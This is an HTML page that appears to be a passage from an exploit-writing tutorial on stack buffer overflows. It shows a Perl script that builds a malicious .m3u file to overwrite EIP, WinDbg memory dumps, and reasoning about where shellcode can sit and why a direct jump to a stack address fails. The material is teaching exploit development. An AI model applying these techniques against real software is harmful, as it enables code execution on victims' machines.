<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Find Memory Space To Host Shellcode</title>
</head><body>We control EIP. So we can point EIP to somewhere else, to a place that contains our own code (shellcode). But where is this space, how can we put our shellcode in that location and how can we make EIP jump to that location ?<br/>
<br/>
In order to crash the application, we have written 26094 A’s into memory, we have written a new value into the saved EIP field (ret), and we have written a bunch of C’s.<br/>
<br/>
When the application crashes, take a look at the registers and dump all of them (d esp, d eax, d ebx, d ebp, …). If you can see your buffer (either the A’s or the C’s) in one of the registers, then you may be able to replace those with shellcode and jump to that location. In our example, We can see that ESP seems to point to our C’s (remember the output of d esp above), so ideally we would put our shellcode instead of the C’s and we tell EIP to go to the ESP address.<br/>
<br/>
Despite the fact that we can see the C’s, we don’t know for sure that the first C (at address 000ff730, where ESP points at), is in fact the first C that we have put in our buffer.<br/>
<br/>
We’ll change the perl script and feed a pattern of characters (I’ve taken 144 characters, but you could have taken more or taken less) instead of C’s :<br/>
<br/>
Create the file, open it, let the application die and dump memory at location ESP :<br/>
<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;44 45 46 47 48 49 4a 4b-32 41 42 43 44 45 46 47 &nbsp;DEFGHIJK2ABCDEFG<br/>
000ff740 &nbsp;48 49 4a 4b 33 41 42 43-44 45 46 47 48 49 4a 4b &nbsp;HIJK3ABCDEFGHIJK<br/>
000ff750 &nbsp;34 41 42 43 44 45 46 47-48 49 4a 4b 35 41 42 43 &nbsp;4ABCDEFGHIJK5ABC<br/>
000ff760 &nbsp;44 45 46 47 48 49 4a 4b-36 41 42 43 44 45 46 47 &nbsp;DEFGHIJK6ABCDEFG<br/>
000ff770 &nbsp;48 49 4a 4b 37 41 42 43-44 45 46 47 48 49 4a 4b &nbsp;HIJK7ABCDEFGHIJK<br/>
000ff780 &nbsp;38 41 42 43 44 45 46 47-48 49 4a 4b 39 41 42 43 &nbsp;8ABCDEFGHIJK9ABC<br/>
000ff790 &nbsp;44 45 46 47 48 49 4a 4b-41 41 42 43 44 45 46 47 &nbsp;DEFGHIJKAABCDEFG<br/>
000ff7a0 &nbsp;48 49 4a 4b 42 41 42 43-44 45 46 47 48 49 4a 4b &nbsp;HIJKBABCDEFGHIJK<br/>
0:000&gt; d<br/>
000ff7b0 &nbsp;43 41 42 43 44 45 46 47-48 49 4a 4b 00 41 41 41 &nbsp;CABCDEFGHIJK.AAA<br/>
000ff7c0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
<br/>
ok, we can see 2 interesting things here :<br/>
<ul><li>ESP starts at the 5th character of our pattern, and not the first character. You can find out why by looking at this forum post : /index.php/forum/writing-exploits/question-about-esp-in-tutorial-pt1</li>
<li>After the pattern string, we see “A’s”. These A’s most likely belong to the first part of the buffer (26101 A’s), so we may also be able to put our shellcode in the first part of the buffer (before overwriting RET)…</li>
</ul>
<br/>
But let’s not go that way yet. We’ll first add 4 characters in front of the pattern and do the test again. If all goes well, ESP should now point directly at the beginning of our pattern :<br/>
<br/>
Let the application crash and look at esp again<br/>
<br/>
my $file= "test1.m3u";<br/>
my $junk= "A" x 26094;<br/>
my $eip = "BBBB";<br/>
my $preshellcode = "XXXX";<br/>
my $shellcode = "1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK" .<br/>
"5ABCDEFGHIJK6ABCDEFGHIJK" .<br/>
"7ABCDEFGHIJK8ABCDEFGHIJK" .<br/>
"9ABCDEFGHIJKAABCDEFGHIJK".<br/>
"BABCDEFGHIJKCABCDEFGHIJK";<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $junk.$eip.$preshellcode.$shellcode;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;31 41 42 43 44 45 46 47-48 49 4a 4b 32 41 42 43 &nbsp;1ABCDEFGHIJK2ABC<br/>
000ff740 &nbsp;44 45 46 47 48 49 4a 4b-33 41 42 43 44 45 46 47 &nbsp;DEFGHIJK3ABCDEFG<br/>
000ff750 &nbsp;48 49 4a 4b 34 41 42 43-44 45 46 47 48 49 4a 4b &nbsp;HIJK4ABCDEFGHIJK<br/>
000ff760 &nbsp;35 41 42 43 44 45 46 47-48 49 4a 4b 36 41 42 43 &nbsp;5ABCDEFGHIJK6ABC<br/>
000ff770 &nbsp;44 45 46 47 48 49 4a 4b-37 41 42 43 44 45 46 47 &nbsp;DEFGHIJK7ABCDEFG<br/>
000ff780 &nbsp;48 49 4a 4b 38 41 42 43-44 45 46 47 48 49 4a 4b &nbsp;HIJK8ABCDEFGHIJK<br/>
000ff790 &nbsp;39 41 42 43 44 45 46 47-48 49 4a 4b 41 41 42 43 &nbsp;9ABCDEFGHIJKAABC<br/>
000ff7a0 &nbsp;44 45 46 47 48 49 4a 4b-42 41 42 43 44 45 46 47 &nbsp;DEFGHIJKBABCDEFG<br/>
0:000&gt; d<br/>
000ff7b0 &nbsp;48 49 4a 4b 43 41 42 43-44 45 46 47 48 49 4a 4b &nbsp;HIJKCABCDEFGHIJK<br/>
000ff7c0 &nbsp;00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;.AAAAAAAAAAAAAAA<br/>
000ff7d0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
<br/>
Much better !<br/>
<br/>
We now have<br/>
<ul><li>control over EIP</li>
<li>an area where we can write our code (at least 144 bytes large. If you do some more tests with longer patterns, you will see that you have even more space… plenty of space in fact)</li>
<li>a register that directly points at our code, at address 0x000ff730</li>
</ul>
<br/>
Now we need to<br/>
<ul><li>build real shellcode</li>
<li>tell EIP to jump to the address of the start of the shellcode. We can do this by overwriting EIP with 0x000ff730.</li>
</ul>
<br/>
Let’s see<br/>
We’ll build a small test case : first 26094 A’s, then overwrite EIP with 000ff730, then put 25 NOP’s, then a break, and then more NOP’s.<br/>
If all goes well, EIP should jump 000ff730, which contains NOPs. The code should slide until the break.<br/>
<br/>
The application died, but we expected a break instead of an access violation.<br/>
When we look at EIP, it points to 000ff730, and so does ESP.<br/>
When we dump ESP, we don’t see what we had expected.<br/>
<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=0000662c<br/>
eip=000ff730 esp=000ff730 ebp=003440c0 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe nc<br/>
cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0xff71f:<br/>
000ff730 0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;add &nbsp; &nbsp; byte ptr [eax],al &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ds:0023:00000001=??<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;00 00 00 00 06 00 00 00-58 4a 10 00 01 00 00 00 &nbsp;........XJ......<br/>
000ff740 &nbsp;30 f7 0f 00 00 00 00 00-41 41 41 41 41 41 41 41 &nbsp;0.......AAAAAAAA<br/>
000ff750 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
<br/>
So jumping directly to a memory address may not be a good solution after all. (000ff730 contains a null byte, which is a string terminator… so the A’s you are seeing are coming from the first part of the buffer… We never reached the point where we started writing our data after overwrite EIP…<br/>
Besides, using a memory address to jump to in an exploit would make the exploit very unreliable. After all, this memory address could be different in other OS versions, languages, etc…)<br/>
Long story short : we cannot just overwrite EIP with a direct memory address such as 000ff730. It’s not a good idea because it would not be reliable, and it’s not a good idea because it contains a null byte. We have to use another technique to achieve the same goal : make the application jump to our own provided code. Ideally, we should be able to reference a register (or an offset to a register), ESP in our case, and find a function that will jump to that register. Then we will try to overwrite EIP with the address of that function and it should be time for pancakes and icecream.<br/>
</body></html>